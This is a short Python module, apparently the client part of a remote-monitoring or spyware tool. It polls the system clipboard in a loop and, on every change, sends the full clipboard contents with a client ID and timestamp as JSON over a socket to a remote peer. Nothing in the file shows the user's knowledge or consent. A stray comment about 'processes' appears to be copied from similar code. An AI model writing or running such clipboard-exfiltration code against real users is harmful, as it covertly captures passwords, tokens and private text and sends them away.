import psutil
import json
import socket
from communication.id import SimpleVariableStorage
from datetime import datetime
import pyperclip

id = SimpleVariableStorage("client_id.json").get_client_id()

def get_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        print("Error getting clipboard:", str(e))
        return ""

def clipboard_listener(socket):
    previous_clipboard = get_clipboard()
    while True:
        try:
            current_clipboard = get_clipboard()
            # Check if the previous processes are the same as the current processes
            if previous_clipboard != current_clipboard:
                
                message = f"Clipboard changed: {str(current_clipboard)}"

                data = {"client_id": id, "type": "information", "part": "clipboard", "data": str(current_clipboard), "message": message, "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
                socket.send(json.dumps(data).encode())
                previous_clipboard = current_clipboard
        except Exception as e:
            print("Error handling process:", str(e))
            break